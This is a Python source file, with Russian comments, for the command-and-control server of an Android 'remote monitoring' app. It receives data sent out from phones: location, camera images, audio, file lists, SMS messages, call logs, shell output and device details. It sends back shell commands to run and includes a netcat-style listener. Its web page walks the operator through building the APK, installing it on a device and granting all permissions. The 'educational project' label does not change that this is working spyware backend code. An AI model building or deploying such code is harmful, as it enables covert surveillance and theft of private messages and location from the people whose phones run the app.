#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
============================================================================
SIMPLE MONITORING SERVER - Простой сервер для приема подключений
============================================================================

Этот скрипт создает простой HTTP сервер для приема подключений от Android
приложения Remote Monitoring System.

Возможности:
- Прием HTTP POST запросов с данными от Android
- WebSocket поддержка для real-time команд  
- Простой web интерфейс для управления
- Логирование всех подключений и команд
- Поддержка HTTPS (опционально)

Автор: ReliableSecurity
Telegram: @ReliableSecurity
GitHub: https://github.com/ReliableSecurity/android-remote-monitoring
============================================================================
"""

import socket
import threading
import json
import time
import argparse
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import ssl

class MonitoringServerHandler(BaseHTTPRequestHandler):
    """HTTP запрос обработчик для Android клиентов"""
    
    def log_message(self, format, *args):
        """Кастомное логирование"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """Обработка GET запросов - веб интерфейс"""
        if self.path == '/':
            self.send_web_interface()
        elif self.path == '/status':
            self.send_status()
        else:
            self.send_404()
    
    def do_POST(self):
        """Обработка POST запросов от Android приложения"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Парсинг JSON данных от Android
            data = json.loads(post_data)
            
            # Определение типа данных
            data_type = data.get('type', 'unknown')
            device_id = data.get('device_id', 'unknown')
            timestamp = data.get('timestamp', int(time.time()))
            
            # Логирование полученных данных
            print(f"\n{'='*60}")
            print(f"📱 ДАННЫЕ ОТ ANDROID УСТРОЙСТВА")
            print(f"{'='*60}")
            print(f"🔗 IP: {self.client_address[0]}:{self.client_address[1]}")
            print(f"📱 Device ID: {device_id}")
            print(f"📊 Тип данных: {data_type}")
            print(f"⏰ Время: {datetime.fromtimestamp(timestamp)}")
            print(f"📄 Размер данных: {len(post_data)} байт")
            
            # Обработка разных типов данных
            if data_type == 'location':
                self.handle_location_data(data)
            elif data_type == 'camera':
                self.handle_camera_data(data)
            elif data_type == 'audio':
                self.handle_audio_data(data)
            elif data_type == 'files':
                self.handle_files_data(data)
            elif data_type == 'sms':
                self.handle_sms_data(data)
            elif data_type == 'calls':
                self.handle_calls_data(data)
            elif data_type == 'shell_command':
                self.handle_shell_command_data(data)
            elif data_type == 'system_info':
                self.handle_system_info_data(data)
            else:
                print(f"❓ Неизвестный тип данных: {data_type}")
                print(f"📄 Сырые данные: {json.dumps(data, indent=2, ensure_ascii=False)}")
            
            print(f"{'='*60}\n")
            
            # Отправка ответа Android приложению
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            response = {
                'status': 'success',
                'message': 'Данные получены',
                'timestamp': int(time.time()),
                'next_command': self.get_next_command()
            }
            
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
            
        except json.JSONDecodeError:
            print(f"❌ Ошибка парсинга JSON: {post_data[:200]}...")
            self.send_error(400, "Invalid JSON")
        except Exception as e:
            print(f"❌ Ошибка обработки запроса: {str(e)}")
            self.send_error(500, "Internal Server Error")
    
    def handle_location_data(self, data):
        """Обработка данных геолокации"""
        location = data.get('data', {})
        lat = location.get('latitude', 0)
        lon = location.get('longitude', 0)
        accuracy = location.get('accuracy', 0)
        
        print(f"📍 ГЕОЛОКАЦИЯ:")
        print(f"   Широта: {lat}")
        print(f"   Долгота: {lon}")
        print(f"   Точность: {accuracy} м")
        print(f"   Google Maps: https://maps.google.com/maps?q={lat},{lon}")
    
    def handle_camera_data(self, data):
        """Обработка данных камеры"""
        camera_info = data.get('data', {})
        image_data = camera_info.get('image', '')
        
        print(f"📸 КАМЕРА:")
        print(f"   Размер изображения: {len(image_data)} символов (base64)")
        
        # Сохранение изображения
        if image_data:
            try:
                import base64
                timestamp = int(time.time())
                filename = f"camera_{timestamp}.jpg"
                
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                print(f"   Сохранено: {filename}")
            except Exception as e:
                print(f"   Ошибка сохранения: {e}")
    
    def handle_audio_data(self, data):
        """Обработка аудио данных"""
        audio_info = data.get('data', {})
        duration = audio_info.get('duration', 0)
        
        print(f"🎤 АУДИО:")
        print(f"   Длительность: {duration} сек")
    
    def handle_files_data(self, data):
        """Обработка файловых данных"""
        files_info = data.get('data', {})
        files = files_info.get('files', [])
        
        print(f"📁 ФАЙЛЫ:")
        print(f"   Количество файлов: {len(files)}")
        for file_info in files[:10]:  # Показываем первые 10
            name = file_info.get('name', 'unknown')
            size = file_info.get('size', 0)
            print(f"   📄 {name} ({size} байт)")
    
    def handle_sms_data(self, data):
        """Обработка SMS данных"""
        sms_info = data.get('data', {})
        messages = sms_info.get('messages', [])
        
        print(f"💬 SMS:")
        print(f"   Количество сообщений: {len(messages)}")
        for msg in messages[:5]:  # Показываем первые 5
            sender = msg.get('address', 'unknown')
            text = msg.get('body', '')[:50] + '...'
            print(f"   📱 {sender}: {text}")
    
    def handle_calls_data(self, data):
        """Обработка данных звонков"""
        calls_info = data.get('data', {})
        calls = calls_info.get('calls', [])
        
        print(f"📞 ЗВОНКИ:")
        print(f"   Количество записей: {len(calls)}")
        for call in calls[:5]:  # Показываем первые 5
            number = call.get('number', 'unknown')
            call_type = call.get('type', 'unknown')
            duration = call.get('duration', 0)
            print(f"   📞 {number} ({call_type}, {duration} сек)")
    
    def handle_shell_command_data(self, data):
        """Обработка результатов shell команд"""
        cmd_info = data.get('data', {})
        command = cmd_info.get('command', '')
        output = cmd_info.get('output', '')
        exit_code = cmd_info.get('exit_code', -1)
        
        print(f"💻 SHELL КОМАНДА:")
        print(f"   Команда: {command}")
        print(f"   Код выхода: {exit_code}")
        print(f"   Размер вывода: {len(output)} символов")
        if output:
            # Показываем первые строки вывода
            lines = output.split('\n')[:5]
            for line in lines:
                print(f"   > {line}")
            if len(output.split('\n')) > 5:
                print(f"   ... и еще {len(output.split('\n')) - 5} строк")
    
    def handle_system_info_data(self, data):
        """Обработка системной информации"""
        sys_info = data.get('data', {})
        
        print(f"📱 СИСТЕМНАЯ ИНФОРМАЦИЯ:")
        for key, value in sys_info.items():
            print(f"   {key}: {value}")
    
    def get_next_command(self):
        """Возврат следующей команды для выполнения на Android"""
        # Здесь можно реализовать очередь команд
        # Пока возвращаем простой пример
        commands = [
            {'type': 'shell', 'command': 'ps | head -10'},
            {'type': 'location', 'command': 'get_location'},
            {'type': 'system_info', 'command': 'get_device_info'},
        ]
        
        # Простая ротация команд
        import random
        return random.choice(commands)
    
    def send_web_interface(self):
        """Отправка простого веб интерфейса"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Android Remote Monitoring Server</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; text-align: center; }
        .status { background: #e8f5e8; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .warning { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
        pre { background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .endpoint { font-family: monospace; background: #e9ecef; padding: 5px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Android Remote Monitoring Server</h1>
        
        <div class="status">
            <strong>✅ Сервер запущен и готов к приему подключений!</strong>
        </div>
        
        <div class="info">
            <h3>📡 Конфигурация сервера:</h3>
            <p><strong>IP адрес:</strong> <span class="endpoint">{server_ip}</span></p>
            <p><strong>Порт:</strong> <span class="endpoint">{server_port}</span></p>
            <p><strong>Endpoint для Android:</strong> <span class="endpoint">http://{server_ip}:{server_port}/</span></p>
        </div>
        
        <div class="warning">
            <h3>⚠️ Настройка Android приложения:</h3>
            <p>1. Соберите APK с этим IP адресом:</p>
            <pre>./scripts/build_apk.sh {server_ip} {server_port} release</pre>
            <p>2. Установите APK на устройство</p>
            <p>3. Разрешите все необходимые права доступа</p>
            <p>4. Подключения будут отображаться в консоли сервера</p>
        </div>
        
        <div class="info">
            <h3>🔗 API Endpoints:</h3>
            <ul>
                <li><span class="endpoint">GET /</span> - Этот интерфейс</li>
                <li><span class="endpoint">GET /status</span> - Статус сервера</li>
                <li><span class="endpoint">POST /</span> - Прием данных от Android</li>
            </ul>
        </div>
        
        <div class="info">
            <h3>📊 Поддерживаемые типы данных:</h3>
            <ul>
                <li>📍 Геолокация (GPS координаты)</li>
                <li>📸 Фотографии с камеры</li>
                <li>🎤 Аудио записи</li>
                <li>📁 Список файлов</li>
                <li>💬 SMS сообщения</li>
                <li>📞 Журнал звонков</li>
                <li>💻 Результаты shell команд</li>
                <li>📱 Системная информация</li>
            </ul>
        </div>
        
        <p style="text-align: center; color: #6c757d; margin-top: 40px;">
            👨‍💻 Автор: ReliableSecurity | 📞 @ReliableSecurity<br>
            ⚖️ <strong>Образовательный проект - используйте этично!</strong>
        </p>
    </div>
</body>
</html>
        """.format(
            server_ip=get_local_ip(),
            server_port=get_server_port()
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def send_status(self):
        """Отправка статуса сервера в JSON"""
        status = {
            'status': 'running',
            'server_ip': get_local_ip(),
            'server_port': get_server_port(),
            'timestamp': int(time.time()),
            'uptime': int(time.time() - server_start_time)
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(status, ensure_ascii=False).encode('utf-8'))
    
    def send_404(self):
        """Отправка 404 ошибки"""
        self.send_error(404, "Page Not Found")

class NetcatLikeServer:
    """Простой TCP сервер в стиле netcat для приема подключений"""
    
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
    
    def start(self):
        """Запуск сервера"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            print(f"🚀 Netcat-like сервер запущен на {self.host}:{self.port}")
            print(f"📡 Ожидание подключений...")
            print(f"🔗 Подключиться можно командой: nc {get_local_ip()} {self.port}")
            print("=" * 60)
            
            while self.running:
                try:
                    client_socket, address = self.socket.accept()
                    print(f"\n📱 Новое подключение: {address[0]}:{address[1]}")
                    
                    # Обработка клиента в отдельном потоке
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("❌ Ошибка принятия подключения")
                        
        except Exception as e:
            print(f"❌ Ошибка запуска сервера: {e}")
    
    def handle_client(self, client_socket, address):
        """Обработка клиента"""
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                message = data.decode('utf-8', errors='ignore')
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                print(f"[{timestamp}] {address[0]} >> {message.strip()}")
                
                # Эхо ответ
                response = f"[{timestamp}] Получено: {len(message)} байт\n"
                client_socket.send(response.encode('utf-8'))
                
        except Exception as e:
            print(f"❌ Ошибка обработки клиента {address[0]}: {e}")
        finally:
            print(f"🔌 Клиент {address[0]} отключился")
            client_socket.close()
    
    def stop(self):
        """Остановка сервера"""
        self.running = False
        if self.socket:
            self.socket.close()

def get_local_ip():
    """Получение локального IP адреса"""
    try:
        # Подключаемся к внешнему адресу для определения локального IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

def get_server_port():
    """Получение порта сервера (для веб интерфейса)"""
    return getattr(get_server_port, 'port', 8080)

# Глобальная переменная для времени старта
server_start_time = time.time()

def main():
    parser = argparse.ArgumentParser(description='Android Remote Monitoring Server')
    parser.add_argument('--ip', default='0.0.0.0', help='IP адрес для привязки (по умолчанию: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=8080, help='Порт для привязки (по умолчанию: 8080)')
    parser.add_argument('--mode', choices=['http', 'netcat'], default='http', 
                       help='Режим работы: http (веб сервер) или netcat (TCP сервер)')
    parser.add_argument('--https', action='store_true', help='Использовать HTTPS (требует сертификат)')
    parser.add_argument('--cert', help='Путь к SSL сертификату')
    parser.add_argument('--key', help='Путь к SSL ключу')
    
    args = parser.parse_args()
    
    # Сохраняем порт для веб интерфейса
    get_server_port.port = args.port
    
    print("🔒 Android Remote Monitoring Server")
    print("👨‍💻 Автор: ReliableSecurity | 📞 @ReliableSecurity")
    print("⚖️ Образовательный проект")
    print("=" * 60)
    
    try:
        if args.mode == 'http':
            # HTTP сервер для Android приложения
            server = HTTPServer((args.ip, args.port), MonitoringServerHandler)
            
            if args.https and args.cert and args.key:
                # HTTPS поддержка
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(args.cert, args.key)
                server.socket = context.wrap_socket(server.socket, server_side=True)
                protocol = "HTTPS"
            else:
                protocol = "HTTP"
            
            local_ip = get_local_ip()
            print(f"🚀 {protocol} сервер запущен")
            print(f"📡 Адрес: {protocol.lower()}://{local_ip}:{args.port}")
            print(f"🌐 Веб интерфейс: {protocol.lower()}://{local_ip}:{args.port}")
            print(f"📱 Android endpoint: {protocol.lower()}://{local_ip}:{args.port}/")
            print()
            print(f"💡 Для сборки APK используйте:")
            print(f"   ./scripts/build_apk.sh {local_ip} {args.port} release")
            print()
            print("🔄 Ожидание подключений от Android устройств...")
            print("=" * 60)
            
            server.serve_forever()
            
        elif args.mode == 'netcat':
            # Простой TCP сервер в стиле netcat
            netcat_server = NetcatLikeServer(args.ip, args.port)
            netcat_server.start()
    
    except KeyboardInterrupt:
        print("\n\n⏹️  Сервер остановлен пользователем")
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
    finally:
        print("👋 Завершение работы сервера...")

if __name__ == '__main__':
    main()